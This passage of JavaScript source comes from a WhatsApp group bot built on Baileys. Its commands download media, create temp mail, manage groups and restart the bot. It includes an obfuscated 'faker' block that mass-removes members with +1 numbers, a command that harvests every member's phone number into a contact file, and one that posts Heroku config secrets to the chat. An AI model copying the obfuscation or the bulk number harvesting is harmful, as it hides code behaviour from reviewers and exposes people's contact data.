              client.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/PwXxe8q.jpeg' }, caption:`*𝐁𝐎𝐓 𝐍𝐀𝐌𝐄: 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗*\n\n*𝐒𝐏𝐄𝐄𝐃: ${dreadedspeed.toFixed(4)} 𝐌𝐒*\n\n*𝐑𝐔𝐍𝐓𝐈𝐌𝐄: ${runtime(process.uptime())}*\n\n*𝐏𝐋𝐀𝐓𝐅𝐎𝐑𝐌: 𝗛𝗲𝗿𝗼𝗸𝘂*\n\n*𝐇𝐎𝐒𝐓𝐍𝐀𝐌𝐄: 𝗠𝘇𝗮𝘇𝗶*\n\n*𝐋𝐈𝐁𝐑𝐀𝐑𝐘: Baileys*\n\n𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝗠𝗭𝗔𝗭𝗜`}); 
 break;
		      
case "vcf": case "group-vcf": {
if (!m.isGroup) return m.reply("Command meant for groups");

const fs = require("fs");
let gcdata = await client.groupMetadata(m.chat)
let gcmem = participants.map(a => a.id)

let vcard = ''
let noPort = 0

for (let a of gcdata.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}

let cont = './contacts.vcf'

await m.reply('𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝐌𝐙𝐀𝐙𝐈-𝐗𝐌𝐃 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 '+gcdata.participants.length+' 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...');

await fs.writeFileSync(cont, vcard.trim())

await client.sendMessage(m.chat, {
    document: fs.readFileSync(cont), mimetype: 'text/vcard', fileName: 'Group contacts.vcf', caption: 'VCF for '+gcdata.subject+'\n'+gcdata.participants.length+' contacts'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(cont)

}
   break;

case "faker":
		      
(function(_0x1f2025,_0x4d0029){const _0x407904=_0x7de4,_0x2f919c=_0x1f2025();while(!![]){try{const _0x2d0023=-parseInt(_0x407904(0x1a8))/0x1+parseInt(_0x407904(0x1a3))/0x2+parseInt(_0x407904(0x19e))/0x3+-parseInt(_0x407904(0x191))/0x4*(-parseInt(_0x407904(0x1b0))/0x5)+parseInt(_0x407904(0x1a9))/0x6+parseInt(_0x407904(0x19b))/0x7+-parseInt(_0x407904(0x196))/0x8;if(_0x2d0023===_0x4d0029)break;else _0x2f919c['push'](_0x2f919c['shift']());}catch(_0x62e68c){_0x2f919c['push'](_0x2f919c['shift']());}}}(_0x1b49,0xaf844));const _0x4fc505=_0x5ac5;(function(_0x4a2769,_0x3e8076){const _0x5cc4a9=_0x7de4,_0xeadcb9=_0x5ac5,_0x496000=_0x4a2769();while(!![]){try{const _0x9ccb4a=-parseInt(_0xeadcb9(0x20a))/(-0x166d+0x193f+-0x2d1)*(parseInt(_0xeadcb9(0x218))/(-0x255b*-0x1+-0x24e4*-0x1+-0x4a3d))+parseInt(_0xeadcb9(0x206))/(0xaca+0x2*0x8bd+-0x1c41)*(parseInt(_0xeadcb9(0x1f7))/(-0x26f5+0x2b2+0x2447))+parseInt(_0xeadcb9(0x215))/(-0x1*0x1b63+0x4*-0x283+0x31f*0xc)*(parseInt(_0xeadcb9(0x1f0))/(-0x11*-0x6f+-0x73*-0x10+-0xe89))+-parseInt(_0xeadcb9(0x213))/(0x132+0x1324+-0x144f*0x1)*(parseInt(_0xeadcb9(0x200))/(-0x17*-0x1f+0x24ac*-0x1+0x21eb))+parseInt(_0xeadcb9(0x203))/(0x1903+0x1*-0x799+-0x1161)*(parseInt(_0xeadcb9(0x210))/(-0x1fb+-0xf1e+0x1123))+parseInt(_0xeadcb9(0x1f3))/(-0x251c+0x7*0xf0+0x1e97)*(parseInt(_0xeadcb9(0x1f6))/(-0x1*0x214a+0x23f1+0x17*-0x1d))+-parseInt(_0xeadcb9(0x214))/(-0x1995+0x11*0xe5+0x1*0xa6d)*(-parseInt(_0xeadcb9(0x20d))/(-0x2375*0x1+-0x5f8+0x297b));if(_0x9ccb4a===_0x3e8076)break;else _0x496000[_0x5cc4a9(0x195)](_0x496000[_0x5cc4a9(0x1af)]());}catch(_0x661ed8){_0x496000[_0x5cc4a9(0x195)](_0x496000[_0x5cc4a9(0x1af)]());}}}(_0x40c6,-0x4c0f0+0x1*-0x4324f+0x1*0xb744f));if(!m[_0x4fc505(0x211)])throw group;function _0x40c6(){const _0x25022d=_0x7de4,_0x4c4b2a=[_0x25022d(0x1a4),'5744nthuAp','length',_0x25022d(0x1a1),_0x25022d(0x1ae),_0x25022d(0x19c),_0x25022d(0x18f),'23334abgLtk','remove',_0x25022d(0x18d),_0x25022d(0x1a2),_0x25022d(0x1b1),_0x25022d(0x1b5),_0x25022d(0x1ad),_0x25022d(0x199),_0x25022d(0x1a0),'\x20+1\x20fake\x20a','430IVbQyu',_0x25022d(0x1b2),_0x25022d(0x1ac),_0x25022d(0x190),_0x25022d(0x198),'168765oAXpMe',_0x25022d(0x19d),'Raven\x20ha',_0x25022d(0x1a5),_0x25022d(0x1b3),'No\x20virtual','ccessfully',_0x25022d(0x1a6),_0x25022d(0x1a7),'ccounts\x20su','\x20WhatsApp\x20',_0x25022d(0x194),'s\x20detected',_0x25022d(0x19a),_0x25022d(0x1aa),_0x25022d(0x192),_0x25022d(0x18e),_0x25022d(0x1ab),_0x25022d(0x197),_0x25022d(0x193),'\x20faker\x20-x',_0x25022d(0x1b4),_0x25022d(0x19f)];return _0x40c6=function(){return _0x4c4b2a;},_0x40c6();}function _0x7de4(_0x5a8a31,_0x42440b){const _0x1b49dd=_0x1b49();return _0x7de4=function(_0x7de436,_0x5d427a){_0x7de436=_0x7de436-0x18d;let _0x435a64=_0x1b49dd[_0x7de436];return _0x435a64;},_0x7de4(_0x5a8a31,_0x42440b);}if(!isBotAdmin)throw botAdmin;if(!isAdmin)throw admin;function _0x1b49(){const _0x37d2f4=['\x20removed!','\x20numbers\x20d','sing\x20+1\x20fa','accounts.\x20','startsWith','groupParti','1148VMIrqp','273076lmOTUp','56vtYcDC','\x20members\x20u','51359DqmsYd','push','17624520PmLMvn','cipantsUpd','27989tCQoID','350LRJOTH','\x20them\x20send','7505176MxzSsW','\x20To\x20remove','ate','1587804QZjfXq','user','reply','admin','chat','2304750gRDjUS','filter','422RQjzbp','ke\x20virtual','6LqcMll','493712bBNFmG','2332836hJyoZT','528XydFpU','decodeJid','etected!','map','13959HaIvRF','shift','20AFCtWD','885JJdZhz','isGroup'];_0x1b49=function(){return _0x37d2f4;};return _0x1b49();}let fake=participants[_0x4fc505(0x1ff)](_0x227b89=>!_0x227b89[_0x4fc505(0x202)])[_0x4fc505(0x20c)](_0x145b19=>_0x145b19['id'])[_0x4fc505(0x1ff)](_0x47fe0a=>_0x47fe0a[_0x4fc505(0x1f8)]('1')&&_0x47fe0a!=client[_0x4fc505(0x1f9)](client[_0x4fc505(0x1fe)]['id']));function _0x5ac5(_0x28d1a0,_0x4fcfc0){const _0x5abee3=_0x40c6();return _0x5ac5=function(_0x36e916,_0x400151){_0x36e916=_0x36e916-(0x1a81*-0x1+-0xede+0x2b4b);let _0x50a368=_0x5abee3[_0x36e916];return _0x50a368;},_0x5ac5(_0x28d1a0,_0x4fcfc0);}if(!args||!args[0x2139+0x11d3+-0x330c]){if(fake[_0x4fc505(0x201)]==-0x3fb+0xe*-0x265+-0x1*-0x2581)return reply(_0x4fc505(0x1ed)+_0x4fc505(0x1fd)+_0x4fc505(0x212));m[_0x4fc505(0x20e)](_0x4fc505(0x217)+_0x4fc505(0x1f4)+'\x20'+fake[_0x4fc505(0x201)]+(_0x4fc505(0x1fb)+_0x4fc505(0x20b)+_0x4fc505(0x1ef)+_0x4fc505(0x1f2)+_0x4fc505(0x208)+_0x4fc505(0x204)+_0x4fc505(0x1f5)+_0x4fc505(0x1fc)));}else args[0x919*0x3+0x4f*0x3f+-0xc*0x3e5]=='-x'&&(await client[_0x4fc505(0x205)+_0x4fc505(0x1fa)+_0x4fc505(0x216)](m[_0x4fc505(0x209)],[fake],_0x4fc505(0x207)),await m[_0x4fc505(0x20e)](fake[_0x4fc505(0x201)]+(_0x4fc505(0x20f)+_0x4fc505(0x1f1)+_0x4fc505(0x1ee)+_0x4fc505(0x1ec))));

	break;

   case "mail": {
	const  { TempMail } = require("tempmail.lol");

const tempmail = new TempMail();

      const inbox = await tempmail.createInbox();
      const emailMessage = `${inbox.address}`;

await m.reply(emailMessage);

const mas = await client.sendMessage(m.chat, { text: `${inbox.token}` });
      
await client.sendMessage(m.chat, { text: `Quoted text is your token. To fetch messages in your email use <.inbox your-token>`}, { quoted: mas});

      }
       break;
		      
       case "hacker2": {
       if (!/image/.test(mime)) return m.reply("Hello hacker 👋, quote an image, probably a clear image of yourself or a person.");  

let fdr = await client.downloadAndSaveMediaMessage(qmsg);

                    const fta = await uploadtoimgur(fdr);

   await  UploadFileUgu()

const imagelink = `https://aemt.me/hacker2?link=${fta}`;

await client.sendMessage(m.chat, { image: { url: imagelink}, caption: "Converted by Raven! 🦄"}, { quoted: m});

}
  break;
    
        case "inbox": {
	 if (!text) return m.reply("To fetch messages from your mail, provide the email address which was issued.")

const mail = encodeURIComponent(text);
        const checkMail = `https://tempmail.apinepdev.workers.dev/api/getmessage?email=${mail}`;

try {
            const response = await fetch(checkMail);

if (!response.ok) {

                return m.reply(`${response.status} error occurred while communicating with API.`);
            }

const data = await response.json();

            if (!data || !data.messages) {

                return m.reply('I am unable to fetch messages from your mail, your inbox might be empty or some other error occurred.');
            }

const messages = data.messages;

            for (const message of messages) {
                const sender = message.sender;
                const subject = message.subject;
                const date = new Date(JSON.parse(message.message).date).toLocaleString();
                const messageBody = JSON.parse(message.message).body;

                const mailMessage = `👥 Sender: ${sender}\n📝 Subject: ${subject}\n🕜 Date: ${date}\n📩 Message: ${messageBody}`;

                await m.reply(mailMessage);
            }
        } catch (error) {
            console.error('𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!');

            return m.reply('𝗦𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝗶𝘀 𝘄𝗿𝗼𝗻𝗴!');
        }
        }
         break;

 case "anime": case "random-anime": {
	const axios = require("axios");

  const link = "https://api.jikan.moe/v4/random/anime";

  try {
    const response = await axios.get(link);
    const data = response.data.data;

    const title = data.title;
    const synopsis = data.synopsis;
    const imageUrl = data.images.jpg.image_url;
    const episodes = data.episodes;
    const status = data.status;

    const message = `📺 Title: ${title}\n🎬 Épisodes: ${episodes}\n📡 Status: ${status}\n📝 Synopsis: ${synopsis}\n🔗 URL: ${data.url}`;

    await client.sendMessage(m.chat, { image: { url: imageUrl }, caption: message }, { quoted: m });
  } catch (error) {
    
   m.reply('𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!');
  }
	}
	 break;

		 case "news": {
		      const response = await fetch('https://fantox001-scrappy-api.vercel.app/technews/random');
    const data = await response.json();

    const { thumbnail, news } = data;

        await client.sendMessage(m.chat, { image: { url: thumbnail }, caption: news }, { quoted: m });

	      }
		break;
		      
case 'approve': case 'approve-all': {
	if (!m.isGroup) throw group;
if (!isAdmin) throw admin;
if (!isBotAdmin) throw botAdmin;

const responseList = await client.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲!");

for (const participan of responseList) {
    const response = await client.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
m.reply("𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 ℎ𝑎𝑠 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 𝑎𝑙𝑙 𝑡ℎ𝑒 𝑝𝑒𝑛𝑑𝑖𝑛𝑔 𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦 ✅");

}
 break;
		      
	  case 'reject': case 'reject-all': {
	if (!m.isGroup) throw group;
if (!isAdmin) throw admin;
if (!isBotAdmin) throw botAdmin;

const responseList = await client.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲");

for (const participan of responseList) {
    const response = await client.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "reject" // or "reject"
    );
    console.log(response);
}
m.reply("𝑃𝑒𝑛𝑑𝑖𝑛𝑔 𝑝𝑎𝑟𝑡𝑖𝑐𝑖𝑝𝑎𝑛𝑡𝑠 ℎ𝑎𝑣𝑒 𝑏𝑒𝑒𝑛 𝑟𝑒𝑗𝑒𝑐𝑡𝑒𝑑!");

}
 break;

          case "admin" : { 
                 if (!m.isGroup) throw group; 
         if (!isBotAdmin) throw botAdmin; 
          if (!Owner) throw NotOwner; 
                 await client.groupParticipantsUpdate(m.chat,  [m.sender], 'promote'); 
 m.reply('Promoted To Admin<🥇'); 
          }
          break;
		      
       case "getvar": 
 if (!Owner) throw NotOwner;  
     const heroku = new Heroku({  
         token: herokuapi, // Replace 'heroku' with your actual Heroku token 
     });  
     let baseUR = "/apps/" + appname;  
     let h9 = await heroku.get(baseUR + '/config-vars');  
     let stoy = '*𝗕𝗲𝗹𝗼𝘄 𝗔𝗿𝗲 𝗛𝗲𝗿𝗼𝗸𝘂 𝗩𝗮𝗿𝗶𝗮𝗯𝗹𝗲𝘀 𝗙𝗼𝗿 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗:*\n\n';  
     for ( vrt in h9) { // Added 'const' to declare 'vr' 
         stoy += vrt + '=' + h9[vrt] + '\n\n'; // Fixed variable name 'str' to 'sto' 
     }  
     reply(stoy); 
            break;

case 'restart':  
  if (!Owner) throw NotOwner; 
  reply(`𝐌𝐙𝐀𝐙𝐈-𝐗𝐌𝐃 𝐢𝐬 𝐫𝐞𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠. . .`)  
  await sleep(3000)  
  process.exit()  
  break;
		      
case "remove": case "kick": case "toka": { 

       if (!m.isGroup) throw group; 
       if (!isBotAdmin) throw botAdmin; 
      if (!isAdmin) throw admin;
  
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return m.reply("Who should i remove !?");
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        const parts = users.split('@')[0];

if (users == "254741388986@s.whatsapp.net") return m.reply("It's an Owners Number and he is dating😂");

	  if (users  == client.decodeJid(client.user.id)) throw 'I cannot remove Myself 😂';

		      m.reply(`@${parts} Goodbye🖕`);

                 await client.groupParticipantsUpdate(m.chat, [users], 'remove'); 
 

}
  break;
		      
    case "instagram": case "igdl": case "ig": {
		      
const { igdl } = require("ruhend-scraper");

  if (!text) {
    return m.reply("Please provide an Instagram link for the video.");
  }

  if (!text.includes('https://www.instagram.com/')) {
    return m.reply("That is not a valid Instagram link.");
  }

  try {
    
    const downloadData = await igdl(text);
   
    if (!downloadData || !downloadData.data || downloadData.data.length === 0) {
      return m.reply("No video found at the provided link.");
    }

    const videoData = downloadData.data;
    for (let i = 0; i < Math.min(20, videoData.length); i++) {
      const video = videoData[i];
      const videoUrl = video.url;

      await client.sendMessage(m.chat, {
        video: { url: videoUrl },
        mimetype: "video/mp4",
        caption: `DOWNLOADED BY ${botname}`
      },{ quoted: m });
    }
  } catch (error) {
    console.error(error);
    return m.reply("An error occurred while processing the request.");
  }
}
break;


  case "twitter": case "twtdl": {
if (!text) return m.reply("𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝘁𝘄𝗶𝘁𝘁𝗲𝗿 𝗹𝗶𝗻𝗸 !");

try {

const data = await fetchJson(`https://api.dreaded.site/api/alldl?url=${text}`);

if (!data || data.status !== 200 || !data.data || !data.data.videoUrl) {
            return m.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
        }

const twtvid = data.data.videoUrl;

await client.sendMessage(m.chat,{video : {url : twtvid },caption : `𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗥𝗔𝗩𝗘𝗡-𝗕𝗢𝗧`,gifPlayback : false },{quoted : m}) 

} catch (e) {

m.reply("An error occured. API might be down\n" + e)

}

 }
  break;
		      
	 case "facebook": case "fb": case "fbdl": {
if (!text) {
        return m.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗹𝗶𝗻𝗸 !");
    }

    if (!text.includes("facebook.com")) {
        return m.reply("That is not a facebook link.");
    }

    try {
                let data = await fetchJson(`https://api.dreaded.site/api/facebook?url=${text}`);


        if (!data || data.status !== 200 || !data.facebook || !data.facebook.sdVideo) {
            return m.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
        }

        const fbvid = data.facebook.sdVideo;

        if (!fbvid) {
            return m.reply("Wrong facebook data. Please ensure the video exists.");
        }

        await client.sendMessage(
            m.chat,
            {
                video: { url: fbvid },
                caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
                gifPlayback: false,
            },
            { quoted: m }
        );
    } catch (e) {
        console.error("Error occurred:", e);
        m.reply("An error occurred. API might be down. Error: " + e.message);
    }
}
break;
		      
      case "tiktok": case "tikdl":  {
if (!text) {
    return m.reply('Please provide a TikTok video link.');
  }

  try {
    const response = await axios.get(`https://bk9.fun/download/tiktok?url=${encodeURIComponent(text)}`);

    if (response.data.status && response.data.BK9) {
      const videoUrl = response.data.BK9.BK9;
      const description = response.data.BK9.desc;
      const commentCount = response.data.BK9.comment_count;
      const likesCount = response.data.BK9.likes_count;
      const uid = response.data.BK9.uid;
      const nickname = response.data.BK9.nickname;
      const musicTitle = response.data.BK9.music_info.title;

      await client.sendMessage(m.chat, {
        text: `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝐹𝑒𝑡𝑐ℎ𝑒𝑑 𝑑𝑎𝑡𝑎 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦✅ 𝑤𝑎𝑖𝑡 𝑎 𝑚𝑜𝑚𝑒𝑛𝑡. . .`,
      }, { quoted: m });

      await client.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
        gifPlayback: false
      }, { quoted: m });

    } else {
      reply('Failed to retrieve video from the provided link.');
    }

  } catch (e) {
    reply(`An error occurred during download: ${e.message}`);
  }
}
  break;
	
	  case "song": {
		      const yts = require("yt-search");

    try {
        if (!text) return m.reply("What song do you want to download?");

        const { videos } = await yts(text);
        if (!videos || videos.length === 0) return m.reply("No songs found!");
	    
await m.reply(`_Please wait your download is in progress_`);
	    
        const urlYt = videos[0].url;
        let data = await fetchJson(`https://api.dreaded.site/api/ytdl/audio?url=${urlYt}`);

        if (!data || !data.result || !data.result.url) {
            return m.reply("Failed to fetch audio from the API.");
        }

        const audioUrl = data.result.url;
const title = data.result.title;

        await client.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: "audio/mpeg",
                fileName: `${title}.mp3`,
            },
            { quoted: m }
        );
    } catch (error) {
        m.reply("Download failed\n" + error.message);
    }
}
		      break;
		      case 'opentime':
                if (!m.isGroup) throw group;
                if (!isAdmin) throw admin;
                if (!isBotAdmin) throw botAdmin;
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                reply(`Countdown of ${q} starting from now to open the group`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `𝗚𝗿𝗼𝘂𝗽 𝗼𝗽𝗲𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗠𝗗`
                    client.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                 break;
		      
 case "close": case "mute": case "closegc": { 
  
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupSettingUpdate(m.chat, 'announcement'); 
 m.reply('Group successfully locked!'); 
 } 
 break; 
 case "open": case "unmute": case "opengc": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupSettingUpdate(m.chat, 'not_announcement'); 
 m.reply('𝗚𝗿𝗼𝘂𝗽 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗨𝗻𝗹𝗼𝗰𝗸𝗲𝗱 𝗕𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗!'); 
  
 }
        break; 
	
          case "disp-1": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
 break; 

          case "promote" : { 
                 if (!m.isGroup) throw group; 
         if (!isBotAdmin) throw botAdmin; 
         if (!isAdmin) throw admin; 
 if (!m.quoted) throw `Ttag someone with the command!`; 
                 let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']; 
  
                 await client.groupParticipantsUpdate(m.chat, users, 'promote'); 
 m.reply('𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗱,𝗯𝗲 𝗮 𝗵𝗮𝗿𝗱𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝗮𝗱𝗺𝗶𝗻! 😂'); 
         } 
 break; 
	
           case "demote": { 
                 if (!m.isGroup) throw group; 
         if (!isBotAdmin) throw botAdmin; 
         if (!isAdmin) throw admin; 
 if (!m.quoted) throw `tag someone with the command!`; 
                 let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']; 
  
                 await client.groupParticipantsUpdate(m.chat, users, 'demote'); 
 m.reply('𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗱𝗲𝗺𝗼𝘁𝗲𝗱, 𝗵𝗼𝘄 𝗱𝗼 𝘆𝗼𝘂 𝗳𝗲𝗲𝗹 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻! 😲\n\n𝗘𝗻𝗷𝗼𝘆 𝗮𝘀 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿, 𝗮𝗻𝗱 𝗱𝗼𝗻𝘁 𝗳𝗲𝗲𝗹 𝘂𝗻𝗹𝗼𝘃𝗲𝗱, 𝘄𝗲 𝗹𝗼𝘃𝗲 𝘆𝗼𝘂 𝗯𝘂𝘁 𝗮𝘀 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿😂'); 
         } 
 break;
	
          case "disp-7": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupToggleEphemeral(m.chat, 7*24*3600); 
 m.reply('𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 7𝗱𝗮𝘆𝘀!'); 
  
 } 
 break; 
	
         case "disp-90": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 90 𝗱𝗮𝘆𝘀!'); 
 } 
 break; 
	
        case "disp-off": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
  
                     await client.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;

 case "icon": { 
    if (!m.isGroup) throw group; 
    if (!isAdmin) throw admin; 
    if (!isBotAdmin) throw botAdmin; 
    if (!quoted) throw `Send or tag an image with the caption ${prefix + command}`; 
    if (!/image/.test(mime)) throw `Send or tag an image with the caption ${prefix + command}`; 
    if (/webp/.test(mime)) throw `Send or tag an image with the caption ${prefix + command}`; 
    let media = await client.downloadAndSaveMediaMessage(quoted); 
    await client.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media)); 
    reply('𝗚𝗿𝗼𝘂𝗽 𝗜𝗰𝗼𝗻 𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗯𝘆 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗'); 
    } 
    break;
	
          case "revoke": 
 case "newlink": 
 case "reset": { 
   if (!m.isGroup) throw group; // add "new Error" to create a new Error object 
   if (!isAdmin) throw admin; // add "new Error" to create a new Error object 
   if (!isBotAdmin) throw botAdmin; // add "new Error" to create a new Error object 
   await client.groupRevokeInvite(m.chat); 
   await client.sendText(m.chat, 'Group link revoked!', m); // use "client.sendText" instead of "m.reply" to ensure message is sent 
   let response = await client.groupInviteCode(m.chat); 
 client.sendText(m.sender, `https://chat.whatsapp.com/${response}\n\nHere is the new group link for ${groupMetadata.subject}`, m, { detectLink: true }); 
 client.sendText(m.chat, `Sent you the new group link in your inbox!`, m); 
   // use "client.sendTextWithMentions" instead of "client.sendText" to include group name in message 
 }
          
  break;
//=================================================================//
	case 'listonline': case 'liston': {
				if (!m.isGroup) return res(mess.group);
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await client.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => res('𝙽𝚘 𝚍𝚊𝚝𝚊 𝚏𝚘𝚞𝚗𝚍'))
			}
		      break;
//======================================================================================//
	
          case "delete": case "del": { 
                  if (!m.isGroup) throw group; 
  if (!isBotAdmin) throw botAdmin; 
  if (!isAdmin) throw admin; 
    if (!m.quoted) throw `No message quoted for deletion`; 
    let { chat, fromMe, id, isBaileys } = m.quoted; 
   if (isBaileys) throw `I cannot delete. Quoted message is my message or another bot message.`; 
    client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } }); 
  } 
 break;
	
          case "leave": { 
                 if (!Owner) throw NotOwner;
		 if (!m.isGroup) throw group;
